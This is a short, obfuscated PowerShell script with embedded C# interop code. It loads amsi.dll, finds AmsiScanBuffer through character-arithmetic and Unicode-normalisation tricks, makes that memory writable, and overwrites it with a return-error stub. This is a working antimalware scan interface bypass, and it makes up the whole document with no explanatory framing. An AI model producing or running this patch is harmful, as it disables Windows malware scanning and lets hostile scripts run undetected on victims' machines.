$TEL3Ry2V13Ma0nvwTL = @"
using System;
using System.Runtime.InteropServices;
public class TEL3Ry2V13Ma0nvwTL {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr AfHqKS2YMvm, string kVA2Re9ay);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lBY, UIntPtr _UFg0Li4f, uint vrswgFB, out uint Mlv);
}
"@

Add-Type $TEL3Ry2V13Ma0nvwTL

$N0NjaoZRx = [TEL3Ry2V13Ma0nvwTL]::LoadLibrary("$([chAr]([BYte]0x61)+[CHar](109)+[char](115*32/32)+[char](105*37/37)+[chAR](8+38)+[CHAR](77+23)+[chAR](108*82/82)+[char](108+2-2))")
$J8fDa8K = [TEL3Ry2V13Ma0nvwTL]::GetProcAddress($N0NjaoZRx, "$(('Àm'+'sî'+'Sc'+'ãn'+'Bù'+'ff'+'èr').NoRMalIZe([ChaR](70*61/61)+[cHAr](111*79/79)+[CHAR]([BYTe]0x72)+[CHaR]([ByTE]0x6d)+[ChaR]([bytE]0x44)) -replace [CHar](92+47-47)+[ChAR](75+37)+[cHAR]([byte]0x7b)+[CHAR]([byTE]0x4d)+[ChAR](110*108/108)+[char](125))")
$p = 0
[TEL3Ry2V13Ma0nvwTL]::VirtualProtect($J8fDa8K, [uint32]5, 0x40, [ref]$p)
$qjwNMyEH5C2tvcD4l = "0xB8"
$Tq47Vom = "0x57"
$DfbWIeJqrGaw = "0x00"
$Rv1q4tpK1DKykMx = "0x07"
$CZ55R_ = "0x80"
$h5jc0h7t = "0xC3"
$pVrd = [Byte[]] ($qjwNMyEH5C2tvcD4l,$Tq47Vom,$DfbWIeJqrGaw,$Rv1q4tpK1DKykMx,+$CZ55R_,+$h5jc0h7t)
[System.Runtime.InteropServices.Marshal]::Copy($pVrd, 0, $J8fDa8K, 6)